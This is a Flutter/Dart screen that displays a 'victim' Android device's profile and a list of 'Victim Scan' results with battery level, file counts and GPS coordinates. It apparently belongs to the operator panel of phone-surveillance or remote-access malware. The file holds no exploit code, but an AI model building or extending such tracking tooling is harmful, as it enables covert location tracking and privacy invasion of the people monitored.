import 'package:flutter/material.dart';
import '../../../data/repositories/scan_repository.dart';
import '../../../models/victim.dart';
import '../../utils/async_data.dart';
import '../../../models/scan_result.dart';
// show profile of one victim
class VictimDetailScreen extends StatefulWidget {
  final Victim victim;
  const VictimDetailScreen({super.key, required this.victim});

  @override
  State<VictimDetailScreen> createState() => _VictimDetailScreenState();
}

class _VictimDetailScreenState extends State<VictimDetailScreen> {
  AsyncData<List<ScanResult>> data = AsyncData.notStarted();

  @override
  void initState() {
    super.initState();
    _fetch();
  }

  void _fetch() async {
    setState(() => data = AsyncData.loading());
    try {
      final scans = await ScanRepository.global.fetchScanForVictim(
        widget.victim.id,
      );
      setState(() => data = AsyncData.success(scans));
    } catch (e) {
      setState(() => data = AsyncData.error(e.toString()));
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(title: Text(widget.victim.deviceModel)),
      body: Column(
        children: [
          // victim profile
          Card(
            margin: EdgeInsets.all(16),
            child: Padding(
              padding: EdgeInsets.all(16),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Text(
                    'Device Profile',
                    style: TextStyle(fontSize: 18, fontWeight: FontWeight.bold),
                  ),
                  SizedBox(height: 8),
                  Text('Model: ${widget.victim.deviceModel}'),
                  Text('Android: ${widget.victim.androidVersion}'),
                  Text('Last seen: ${widget.victim.lastSeen.toLocal()}'),
                  Text('ID: ${widget.victim.id}'),
                ],
              ),
            ),
          ),

          // scan history for this victim
          Text(
            'Scan History',
            style: TextStyle(fontSize: 16, fontWeight: FontWeight.bold),
          ),
          Expanded(
            child: switch (data.status) {
              AsyncStatus.notStarted => Center(child: Text('Loading...')),
              AsyncStatus.loading => Center(child: CircularProgressIndicator()),
              AsyncStatus.error => Center(
                child: Text(data.error!, style: TextStyle(color: Colors.red)),
              ),
              AsyncStatus.success => _buildScans(data.value!),
            },
          ),
        ],
      ),
    );
  }

 Widget _buildScans(List<ScanResult> scans) {
  if (scans.isEmpty) return Center(child: Text('No scans yet'));
  return ListView.builder(
    itemCount: scans.length,
    itemBuilder: (ctx, i) {
      final s = scans[i];
      return ListTile(
        leading: Icon(Icons.search),
        title: Text('Victim Scan'),
        subtitle: Column(                          
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Text('Battery: ${s.battery}% · Files: ${s.fileCount}'),
            Text('${s.timestamp.toLocal()}'),
            // show GPS if available
            if (s.latitude != null)
              Text(
                'GPS: ${s.latitude!.toStringAsFixed(4)}, ${s.longitude!.toStringAsFixed(4)}',
                style: TextStyle(color: Colors.green),
              )
            else
              Text('GPS: Not available', style: TextStyle(color: Colors.grey)),
          ],
        ),
        trailing: s.latitude != null
            ? Icon(Icons.location_on, color: Colors.green)
            : Icon(Icons.location_off, color: Colors.grey),
      );
    },
  );
}
}
